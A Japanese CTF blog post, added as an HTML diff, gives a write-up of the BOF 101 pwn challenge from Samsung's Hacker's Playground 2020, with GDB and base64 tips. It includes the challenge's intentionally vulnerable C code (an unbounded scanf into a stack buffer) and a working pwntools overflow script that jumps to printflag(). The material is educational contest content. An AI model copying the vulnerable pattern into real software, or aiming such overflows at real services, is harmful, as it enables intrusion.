@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Hacker&#39;s Playground Writeup (Samsung Security Tech Forum 2020) - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="URL: https://playground.sstf.site/ Samsung主催のCTFっぽいですね。 平日火曜日に6時間だけやっていて、たまたま年休を取っていたので参加できました。 275 points で、最終順位は" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/hackers_playground_2020/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.78f8f17bab244b9ee62ad16480c9584d5fc2db06ae20681d1ca225cefd80767c.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="Hacker&#39;s Playground Writeup (Samsung Security Tech Forum 2020)" />
+<meta property="og:description" content="URL: https://playground.sstf.site/ Samsung主催のCTFっぽいですね。 平日火曜日に6時間だけやっていて、たまたま年休を取っていたので参加できました。 275 points で、最終順位は" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/hackers_playground_2020/" />
+<meta property="article:published_time" content="2020-08-18T15:00:00+09:00" />
+<meta property="article:modified_time" content="2020-08-18T15:00:00+09:00" />
+<meta itemprop="name" content="Hacker&#39;s Playground Writeup (Samsung Security Tech Forum 2020)">
+<meta itemprop="description" content="URL: https://playground.sstf.site/ Samsung主催のCTFっぽいですね。 平日火曜日に6時間だけやっていて、たまたま年休を取っていたので参加できました。 275 points で、最終順位は">
+<meta itemprop="datePublished" content="2020-08-18T15:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2020-08-18T15:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="1027">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hacker&#39;s Playground Writeup (Samsung Security Tech Forum 2020)"/>
+<meta name="twitter:description" content="URL: https://playground.sstf.site/ Samsung主催のCTFっぽいですね。 平日火曜日に6時間だけやっていて、たまたま年休を取っていたので参加できました。 275 points で、最終順位は"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Hacker&#39;s Playground Writeup (Samsung Security Tech Forum 2020)</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-08-18 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn-bof-101-50-points">[Pwn]: BOF 101 (50 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#おまけ１">おまけ１</a></li>
+    <li><a href="#おまけ２">おまけ２</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fhackers_playground_2020%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://playground.sstf.site/">https://playground.sstf.site/</a></p>
+<p><br />
+Samsung主催のCTFっぽいですね。</p>
+<p>平日火曜日に6時間だけやっていて、たまたま年休を取っていたので参加できました。</p>
+<p><br />
+275 points で、最終順位は 90位 でした。</p>
+<img src="https://captureamerica.github.io/writeups/img/hackers_playground_2020_Score.png" alt="hackers_playground_2020_Score.png">
+<p><br />
+といっても、最初の方のチャレンジにはTutorial（ほぼwriteup）が付いていて、その通りにやれば 275 points 取れます。</p>
+<p>見たところ、43位〜114位はみんな 275 points でした。:)</p>
+<p><br />
+以下、チャレンジです。</p>
+<img src="https://captureamerica.github.io/writeups/img/hackers_playground_2020_Challenges1.png" alt="hackers_playground_2020_Challenges1.png">
+<br />
+<img src="https://captureamerica.github.io/writeups/img/hackers_playground_2020_Challenges2.png" alt="hackers_playground_2020_Challenges2.png">
+<p><br /></p>
+<p>Tutorialが付いていたやつしか解いてないし、Tutorialががほぼwriteupなので、別途自分がwriteupを書くほどのことでもないんですが、Pwnのチャレンジだけ記録に残しておきます。</p>
+<p><u><b>いちおう、これはTutorialを見ずに解きました。</b></u></p>
+<p><br /><br /></p>
+<h2 id="pwn-bof-101-50-points">[Pwn]: BOF 101 (50 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>You might have heard about BOF.
+<br />
+It&rsquo;s the most common vulnerability in executable binaries.
+<br /><br />
+The binary is running at:
+<br />
+nc bof101.sstf.site 1337.
+<br /><br />
+Can you smash it?
+<br />
+Just execute printflag() function and get the flag!</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>
+<p>bof101 (64bit ELF)</p>
+</li>
+<li>
+<p>bof101.c</p>
+</li>
+</ul>
+<p>ソースの中身</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="c1">//#include &lt;fcntl.h&gt;
+</span><span class="c1">//#include &lt;unistd.h&gt;
+</span><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">printflag</span><span class="p">(){</span> 
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+	<span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/flag&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span> 
+	<span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+	<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">check</span><span class="o">=</span><span class="mh">0xdeadbeef</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">140</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;printflag()&#39;s addr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">printflag</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is your name?</span><span class="se">\n</span><span class="s">: &#34;</span><span class="p">);</span>
+	<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>	
+	<span class="k">if</span> <span class="p">(</span><span class="n">check</span> <span class="o">!=</span> <span class="mh">0xdeadbeef</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[Warning!] BOF detected!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+		<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>とりあえず、2回アクセスしてみて2回とも同じアドレスが取れたので、スクリプトで読み取る処理はせず、スクリプトの中でそのままアドレスを書いてます。</p>
+<pre>
+$ nc bof101.sstf.site 1337
+printflag()'s addr: 0x555555555229
+What is your name?
+: aaa
+
+$ nc bof101.sstf.site 1337
+printflag()'s addr: 0x555555555229
+What is your name?
+: bbb
+</pre>
+<p><br /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;bof101.sstf.site&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">140</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="c1"># 16 byte alignment</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x555555555229</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>Flag: <code>SCTF{n0w_U_R_B0F_3xpEr7}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="おまけ１">おまけ１</h2>
+<hr>
+<p>まずは、Tutorialに書いてあった中から、勉強になったことをPickup。</p>
+<p>GDBのオプションです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="hl"><span class="lnt">4
+</span></span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">&gt; x/s <span class="nv">$rcx</span>
+<span class="s2">&#34;Rev3ngineering1&#34;</span>...
+
+<span class="hl">&gt; <span class="nb">set</span> print element <span class="m">0</span>
+</span>&gt; x/s <span class="nv">$rcx</span>
+<span class="s2">&#34;Rev3ngineering1sc00l!&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br />
+使ったことのないオプションだったので、ググって以下の説明を見つけました。</p>
+<p><a href="https://stackoverflow.com/questions/233328/how-do-i-print-the-full-value-of-a-long-string-in-gdb">https://stackoverflow.com/questions/233328/how-do-i-print-the-full-value-of-a-long-string-in-gdb</a></p>
+<blockquote>
+<p>Set a limit on how many elements of an array GDB will print. If GDB is printing a large array, it stops printing after it has printed the number of elements set by the set print elements command. This limit also applies to the display of strings. When GDB starts, this limit is set to 200. Setting number-of-elements to zero means that the printing is unlimited.</p>
+</blockquote>
+<p>へぇ〜。</p>
+<p>.gdbinitに書いておけばいいのかな。</p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="おまけ２">おまけ２</h2>
+<hr>
+<p>最近、Macbook Airを購入して、またMacをメインに使い出しました。</p>
+<p>チャレンジのひとつの中に、<code>base64 -i -d</code> というのが出てきて、<code>base64 -d</code>がMacだと<code>base64 -D</code>になるのは知ってたんですが、<code>-i</code>オプションもMacだと別の意味になるようです。</p>
+<p>いちいちアタマを切り替えるのが面倒なので、Gnu版base64をMacで使えないか調べてみたら、<code>gbase64</code> というのがすでにMacに入っていたことが判明。</p>
+<p><br />
+aliasを設定しておきました。</p>
+<pre>
+alias base64='gbase64'
+</pre>
+<p><br />
+これで、ハッピー。</p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2020-08-18
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/cybrics_ctf_2020/">
+            <span class="next-text nav-default">CyBRICS CTF 2020 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2020
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.d7b7ada643c9c1a983026e177f141f7363b4640d619caf01d8831a6718cd44ea.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
